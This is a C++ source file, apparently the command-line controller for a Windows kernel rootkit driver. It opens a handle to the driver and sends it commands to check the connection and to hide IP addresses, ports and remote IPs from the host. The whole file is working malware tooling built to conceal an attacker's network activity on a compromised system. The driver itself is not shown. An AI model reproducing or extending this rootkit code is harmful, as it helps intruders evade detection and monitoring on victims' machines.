#include "DriverHandler.h"

int main(int argc, const char* argv[])
{
	if (argc < 2)
	{
		std::cerr << "Missing Command Argument. (check-connection, hide-ip, hide-port, hide-remote-ip)" << std::endl;
		return -1;
	}

	//rootkit_handler: interacts with rootkit driver
	Driver::DriverHandler rootkit_handler{};
	if (rootkit_handler.device_handle() == INVALID_HANDLE_VALUE)
	{
		return logError("couldn't open a handle");
	}

	const char* cmd = argv[1];
	if (!strcmp(cmd, "check-connection"))
	{
		return rootkit_handler.CmdCheckConnection(argc, argv);
	}
	else if (!strcmp(cmd, "hide-ip"))
	{
		return rootkit_handler.CmdNetHideIp(argc, argv);
	}
	else if (!strcmp(cmd, "hide-port"))
	{
		return rootkit_handler.CmdNetHidePort(argc, argv);
	}
	else if (!strcmp(cmd, "hide-remote-ip"))
	{
		return rootkit_handler.CmdNetHideRemoteIp(argc, argv);
	}
	else
	{
		std::cerr << "Command Not Valid. (check-connection, hide-ip, hide-port, hide-remote-ip)" << std::endl;
		return -1;
	}

	return 0;
}